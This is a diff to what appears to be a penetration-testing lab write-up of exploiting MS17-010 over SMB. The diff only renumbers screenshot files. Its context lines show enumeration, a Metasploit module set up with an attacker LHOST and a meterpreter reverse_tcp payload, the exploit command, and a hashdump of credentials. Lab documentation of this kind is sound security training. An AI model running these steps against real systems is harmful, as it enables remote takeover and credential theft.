@@ -76,7 +76,7 @@ Gathered additional host, share, and user information via enum4linux.
 enum4linux -a <target-ip>
 ```
 
-![enum4linux](Screenshots/04-enum4linux.png)
+![enum4linux](Screenshots/05-enum4linux.png)
 
 ### 5. MS17-010 Vulnerability Confirmation
 Ran Nmap's SMB vulnerability script to confirm exposure to MS17-010.
@@ -103,7 +103,7 @@ msfconsole
 search ms17-010
 ```
 
-![Metasploit Search](Screenshots/06-metasploit-search.png)
+![Metasploit Search](Screenshots/10-metasploit-search.png)
 
 ### 7. Module Options
 Selected the exploit module and reviewed/configured required options.
@@ -116,7 +116,7 @@ set LHOST <attacker-ip>
 set PAYLOAD windows/x64/meterpreter/reverse_tcp
 ```
 
-![Module Options](Screenshots/07-module-options.png)
+![Module Options](Screenshots/11-module-options.png)
 
 ### 8. Running the Exploit
 Executed the exploit against the target to gain remote code execution.
@@ -125,7 +125,7 @@ Executed the exploit against the target to gain remote code execution.
 exploit
 ```
 
-![Running Exploit](Screenshots/08-running-exploit.png)
+![Running Exploit](Screenshots/12-running-exploit.png)
 
 ### 9. Meterpreter Session
 Obtained a Meterpreter session with SYSTEM-level privileges and confirmed access.
@@ -136,7 +136,7 @@ meterpreter > sysinfo
 meterpreter > hashdump
 ```
 
-![Meterpreter Session](Screenshots/09-meterpreter-session.png)
+![Meterpreter Session](Screenshots/14-meterpreter-session.png)
 
 ---
 
